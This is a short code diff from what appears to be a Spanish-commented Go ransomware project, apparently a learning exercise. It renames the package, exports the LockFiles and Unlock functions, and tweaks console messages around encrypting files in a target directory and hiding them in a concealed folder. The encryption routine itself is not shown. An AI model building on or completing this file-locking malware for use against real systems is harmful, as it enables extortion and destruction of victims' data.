@@ -1,4 +1,4 @@
-package modules // El nombre del paquete se va a importar al main 
+package atenea
 
 import (
     "encoding/json"
@@ -7,17 +7,16 @@ import (
     "path/filepath"
     "strings"
 
-    crypto "ransomware/modules/cryptoUncrypt" //  Nombre de las función 
 )
 
-}func lockFiles(key []byte){  // ← key como parámetro
+func LockFiles(key []byte){  // ← key como parámetro - Mayúscula
 	if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
 		fmt.Printf("[!]Error: Directory %s does not exist\n", TARGET_DIR)
 		fmt.Printf("   Create it first: mkdir %s\n", TARGET_DIR)
 		os.Exit(1)
 	}
 
-	fmt.Println("\n Encrypting files...")
+	fmt.Println("\n🔒 Encrypting files...")
 
 	//Carpeta oculta para guardar los archivos encriptados, para eso usamos un filepath.Join() que une rutas de forma segura
 	hiddenDir := filepath.Join(TARGET_DIR, HIDDEN_FOLDER)
@@ -113,8 +112,8 @@ import (
 	fmt.Printf("\n✓ Successfully encrypted %d files\n", count)
 }
 
-func unlock(key []byte){  
-    fmt.Println("\n Unlocking files...")  
+func Unlock(key []byte){  // ← Mayúscula
+    fmt.Println("\n🔓 Unlocking files...")  
 
     //Verifica el directorio target
     if _, err := os.Stat(TARGET_DIR); os.IsNotExist(err){
